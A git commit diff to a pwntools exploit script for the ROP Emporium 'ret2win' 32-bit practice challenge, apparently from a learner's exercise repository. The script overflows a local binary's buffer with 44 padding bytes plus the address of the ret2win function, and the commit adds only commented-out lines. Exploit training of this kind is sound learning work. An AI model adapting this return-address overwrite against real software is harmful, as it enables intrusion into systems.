2818499deaa2389b92987c9bcb51d5ffe174027f
root <root@localhost.localdomain>
2018-06-21 14:25:09 +0800

    add file

--- ropemporium/ret2win/ret2win32.py
+++ ropemporium/ret2win/ret2win32.py
@@ -1,10 +1,14 @@
 from pwn import *
 
+#elf = ELF('ret2win32')
 p = process('./ret2win32')
 
 junk = "A" * 44
 
+#ret2win_addr = elf.symbols(['ret2win'])
 ret2win_addr = 0x08048659
+
+#print "ret2win addr = " + hex(ret2win_addr)
 
 payload = junk + p32(ret2win_addr)
 
